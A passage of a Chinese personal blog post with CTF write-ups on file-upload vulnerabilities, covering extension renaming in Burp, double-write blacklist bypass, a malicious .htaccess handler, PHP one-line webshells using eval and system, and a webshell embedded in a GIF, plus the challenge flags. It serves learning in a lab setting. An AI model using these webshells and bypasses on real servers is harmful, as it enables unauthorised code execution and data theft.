+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a><strong>题解</strong></h3><ol>
+<li><p>打开 burp进行拦包, 注意是在上传成功之后再进行拦包</p>
+</li>
+<li><p>发送到 Repeater模块</p>
+</li>
+<li><p>发送之后就可以把 Proxy模块里面的 Intercept关掉, 不然后面蚁剑连接容易出错误</p>
+</li>
+<li><p>修改 filename, 将后缀 gif修改为 php, 以保证我们的代码能够正常执行</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530939.png" alt="3-5.png"></p>
+</li>
+<li><p>打开蚁剑, 输入木马所在地址</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530940.png" alt="3-3.png"></p>
+</li>
+</ol>
+<p>密码是在木马中POST传入的参数</p>
+<ol>
+<li><p>连接成功, 进入靶机的服务器</p>
+</li>
+<li><p>找到 flag, 给他扬喽!</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530941.png" alt="3-4.png"></p>
+</li>
+</ol>
+<blockquote>
+<p>flag{9f6acfb7-5a74-4a2f-ac21-c75bbe86f8fd}</p>
+</blockquote>
+<h3 id="解题心得"><a href="#解题心得" class="headerlink" title="解题心得"></a><strong>解题心得</strong></h3><p>一道很典型很容易上手的文件上传题目, 没有耍太多心眼, 修改木马后缀名, 再用burp抓包修改成php后缀就成功了, 并且初步学习了蚁剑的用法</p>
+<h2 id="【Web-Level2】EZ-upload-js"><a href="#【Web-Level2】EZ-upload-js" class="headerlink" title="【Web Level2】EZ_upload-js"></a><strong>【Web Level2】EZ_upload-js</strong></h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><ol>
+<li><p>以个人的做题感觉, 与上面一道题, 在分析和解题过程上没有太大差别, 只是找木马地址时有一些区别</p>
+</li>
+<li><p>打开题目我们首先上传一个后缀 php的文件, 果然寄了, 并提示我们要上传图片形式的文件</p>
+</li>
+<li><p>接着, 我们把上一道题用的木马 zsq.gif传上去</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530942.png" alt="3-6.png"></p>
+</li>
+<li><p>下面我们需要获得木马的地址, 这道题并没有直接给我们, 那么是时候开启我们的burp了</p>
+</li>
+</ol>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a><strong>题解</strong></h3><ol>
+<li>打开 burp进行拦包, 并发送到 Repeater模块</li>
+<li>与上一道题一样, 修改 filename, 修改完点击 send发送, 木马上传成功</li>
+<li>查看 Response中的有用信息, 寻找木马地址</li>
+<li>成功找到地址</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://srunl53aaj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmEwYjFlN2UyMWJiYzRlOGRiZWZiMjcwMzJjMmIwM2VfTGl3MVZDS3JKbHV4eDZxcWFXU1JZM2VzS3JPUWQycGVfVG9rZW46Ym94Y250b1B2NXdLUm1EUVliODBQMTVKN2VnXzE2NzMwMDI0MzE6MTY3MzAwNjAzMV9WNA">https://srunl53aaj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmEwYjFlN2UyMWJiYzRlOGRiZWZiMjcwMzJjMmIwM2VfTGl3MVZDS3JKbHV4eDZxcWFXU1JZM2VzS3JPUWQycGVfVG9rZW46Ym94Y250b1B2NXdLUm1EUVliODBQMTVKN2VnXzE2NzMwMDI0MzE6MTY3MzAwNjAzMV9WNA</a></p>
+<p>img</p>
+<ol>
+<li>后面打开蚁剑, 进行连接, 步骤与上一题一样, 不再赘述</li>
+<li>得到flag &gt; flag{aee0-14b14124-fe03c361-1eed93589}</li>
+</ol>
+<h3 id="解题心得-1"><a href="#解题心得-1" class="headerlink" title="解题心得"></a><strong>解题心得</strong></h3><p>个人认为文件上传主要有两个主要内容, 第一个是上传木马, 第二个是找到木马所在的位置, 上一道题是练习上传木马, 这一道题是练习寻找木马位置</p>
+<h2 id="【Web-level-2】upload"><a href="#【Web-level-2】upload" class="headerlink" title="【Web level 2】upload"></a><strong>【Web level 2】upload</strong></h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><ol>
+<li>这道题给出了关键的三行判断代码, 很明显是是一道黑名单绕过的题目</li>
+<li>根据代码, 在黑名单里面的后缀格式, 都会被转为””</li>
+<li>尝试上传后缀php的文件</li>
+</ol>
+<blockquote>
+<p>上传zsq.php, 在burp中拦包后发现, 只剩下了一个zsq.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530943.png" alt="3-8.png"></p>
+</blockquote>
+<ol>
+<li>尝试了很多种方法都寄了, 最后发现双写绕过的方法成功了</li>
+</ol>
+<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a><strong>题解</strong></h3><ol>
+<li>随便改个后缀模式上传, 打开burp进行拦包处理</li>
+<li>将后缀改为pphpph, 再次发送</li>
+<li>“php”会被替换为“”, p“php”hp在被替换之后会变成p“”hp, 也就是我们需要的php</li>
+<li>打开蚁剑进行连接</li>
+<li>找到flag, 扬喽!</li>
+</ol>
+<h3 id="解题心得-2"><a href="#解题心得-2" class="headerlink" title="解题心得"></a><strong>解题心得</strong></h3><p>一道黑名单绕过的题目, 尝试并且学习了不少关于黑名单绕过的方法, 很有收获</p>
+<h2 id="【Web-Level2】EZ-UPLOAD"><a href="#【Web-Level2】EZ-UPLOAD" class="headerlink" title="【Web Level2】EZ_UPLOAD"></a><strong>【Web Level2】EZ_UPLOAD</strong></h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><ol>
+<li><p>先随便传个php试试, 无法通过, 上传图片成功</p>
+</li>
+<li><p>用之前的方法, 上传zsq.png 用burp 抓包再修改后缀名, 发现还是无法通过</p>
+</li>
+<li><p>之后我们考虑上传配置文件的方法</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530944.png" alt="3-9.png"></p>
+</li>
+<li><p>很奇怪, 上传.htaccess文件是成功的, 但是上传.user.ini文件就寄掉</p>
+</li>
+<li><p>后面查看源码发现, 是给.htaccess留了后门, 所以能够上传成功</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(  <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span>  || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;htaccess&quot;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;fail&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> 图片上传成功!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;你在传什么鬼啊&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>那我们就写一个.htaccess文件传上去</li>
+</ol>
+<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a><strong>题解</strong></h3><ol>
+<li>写一个.htaccess文件并上传</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch &quot;zsq&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>上传zsq.png</li>
+<li>打开蚁剑进行连接</li>
+<li>此时的文件后缀直接用上传时的png就可以, 不需要用php(毕竟也没有zsq.php的文件)</li>
+<li>成功连接</li>
+<li>找到flag, 扬喽!</li>
+</ol>
+<h3 id="解题心得-3"><a href="#解题心得-3" class="headerlink" title="解题心得"></a><strong>解题心得</strong></h3><p>这道题主要考察了上传配置文件绕过, 虽然对配置文件这样的写法还不了解, 但是照葫芦画瓢, 也能成功的解出</p>
+<h2 id="【Web-level1】No-Antsword"><a href="#【Web-level1】No-Antsword" class="headerlink" title="【Web level1】No Antsword"></a><strong>【Web level1】No Antsword</strong></h2><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><ol>
+<li>审题知道，首先不能用蚁剑</li>
+<li>那么我们考虑使用Linux的cmd命令来输出flag内容</li>
+<li>首先上传zsq.gif并进行抓包</li>
+<li>通过修改命令找到flag文件</li>
+</ol>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a><strong>解题</strong></h3><ol>
+<li>写好我们的一句话木马, 修改后缀gif并上传， 用burp抓包</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls .&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>在当前目录没找到, 去上一级目录再找</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls ..&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>flag.php uploads</p>
+</blockquote>
+<ol>
+<li>运气很好, 找到flag的文件了</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat ../flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>输出flag内容</li>
+</ol>
+<h3 id="解题心得-4"><a href="#解题心得-4" class="headerlink" title="解题心得"></a><strong>解题心得</strong></h3><p>这道题主要考察一句话木马的使用以及对Linux命令的操作</p>
+<h2 id="【Web-Level4】EZ-double-render"><a href="#【Web-Level4】EZ-double-render" class="headerlink" title="【Web Level4】EZ_double_render"></a><strong>【Web Level4】EZ_double_render</strong></h2><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><p>这道题是通过图片的形式，将木马插入在图片中，以达到连接的作用，这里使用了工具010EditorPortable，用于图片的比对</p>
+<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a><strong>题解</strong></h3><ol>
+<li>先随便找一张gif图，命名为1.gif</li>
+<li>写一句话木马 ，命名为zsq.php</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zsq&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>在命令行中键入以下操作</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + zsq.php /a 2.gif</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将图片上传，并从靶机中把图片下载到本地，命名为2_after.gif</li>
+<li>使用010EditorPortable进行比对，寻找没有变化的部分</li>
+<li>在没有变化的部分编辑一句话木马，并保存图片再次上传</li>
+<li>上传后保存地址进行蚁剑连接</li>
+<li>这里有一个file传参, 直接连接不能成功, 猜测是需要将图片地址传给参数file(xxx.xxx.xxx.xxx&#x2F;?file&#x3D;upload&#x2F;2_after.gif)</li>
+<li>拿到flag, 结束</li>
+<li>更细节的步骤请查阅网址<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119177948">https://blog.csdn.net/weixin_45588247/article/details/119177948</a></li>
+</ol>
+<h3 id="个人心得"><a href="#个人心得" class="headerlink" title="个人心得"></a><strong>个人心得</strong></h3><p>这道题其实我没用到步骤6., 因为我上传并拿下来的gif图没有被渲染,可以直接进行蚁剑的连接, 但是方法要学会。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zishuq.github.io">zishuQ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zishuq.github.io/article/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">https://zishuq.github.io/article/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zishuq.github.io" target="_blank">zishuQ's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/Java%E7%AE%97%E6%B3%95/%E5%A4%A7%E6%95%B0%E7%B1%BB/%E5%A4%A7%E6%95%B0%E7%B1%BB/" title="大数类"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">大数类</div></div></a></div><div class="next-post pull-right"><a href="/article/%E6%9D%82%E7%B1%BB/Docker/Docker/" title="Docker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Docker</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zishuQ</div><div class="author-info__description">用于记录学习内容的个人博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/zishuQ" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zishuq77@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">1、一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2、绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1、客户端检测绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 服务端MIME绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9B%AE%E5%BD%95%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 服务端目录检测绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.3.</span> <span class="toc-text">3、黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1%E3%80%81%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1、特殊文件名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E4%B8%8A%E4%BC%A0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 上传配置文件绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">4、漏洞解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 IIS解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">1.5.</span> <span class="toc-text">5、白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-0x00%E6%88%96-00%E6%88%AA%E6%96%AD"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 0x00或%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 利用文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 漏洞解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.4.</span> <span class="toc-text">5.4 文件内容检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%B7%A9%E5%9B%BA"><span class="toc-number">2.</span> <span class="toc-text">例题巩固</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-Level1%E3%80%91ez-upload"><span class="toc-number">2.1.</span> <span class="toc-text">【Web Level1】ez_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.1.2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97"><span class="toc-number">2.1.3.</span> <span class="toc-text">解题心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-Level2%E3%80%91EZ-upload-js"><span class="toc-number">2.2.</span> <span class="toc-text">【Web Level2】EZ_upload-js</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">解题心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-level-2%E3%80%91upload"><span class="toc-number">2.3.</span> <span class="toc-text">【Web level 2】upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97-2"><span class="toc-number">2.3.3.</span> <span class="toc-text">解题心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-Level2%E3%80%91EZ-UPLOAD"><span class="toc-number">2.4.</span> <span class="toc-text">【Web Level2】EZ_UPLOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-number">2.4.2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97-3"><span class="toc-number">2.4.3.</span> <span class="toc-text">解题心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-level1%E3%80%91No-Antsword"><span class="toc-number">2.5.</span> <span class="toc-text">【Web level1】No Antsword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.5.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97-4"><span class="toc-number">2.5.3.</span> <span class="toc-text">解题心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90Web-Level4%E3%80%91EZ-double-render"><span class="toc-number">2.6.</span> <span class="toc-text">【Web Level4】EZ_double_render</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-number">2.6.2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97"><span class="toc-number">2.6.3.</span> <span class="toc-text">个人心得</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/uncategorized/hello-world/" title="Hello World">Hello World</a><time datetime="2023-07-30T23:33:33.900Z" title="发表于 2023-07-31 07:33:33">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java%E5%BC%80%E5%8F%91/JavaWeb/Web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/Web%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" title="Web后端开发">Web后端开发</a><time datetime="2023-07-30T23:16:03.000Z" title="发表于 2023-07-31 07:16:03">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java%E5%BC%80%E5%8F%91/JavaWeb/Web%E5%85%A5%E9%97%A8/Web%E5%85%A5%E9%97%A8/" title="Web入门">Web入门</a><time datetime="2023-07-30T02:27:55.000Z" title="发表于 2023-07-30 10:27:55">2023-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java%E5%BC%80%E5%8F%91/JavaWeb/Maven/Maven/" title="Maven">Maven</a><time datetime="2023-07-29T08:13:22.000Z" title="发表于 2023-07-29 16:13:22">2023-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java%E5%BC%80%E5%8F%91/JavaWeb/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/" title="前端工程">前端工程</a><time datetime="2023-07-28T02:51:38.000Z" title="发表于 2023-07-28 10:51:38">2023-07-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By zishuQ</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script 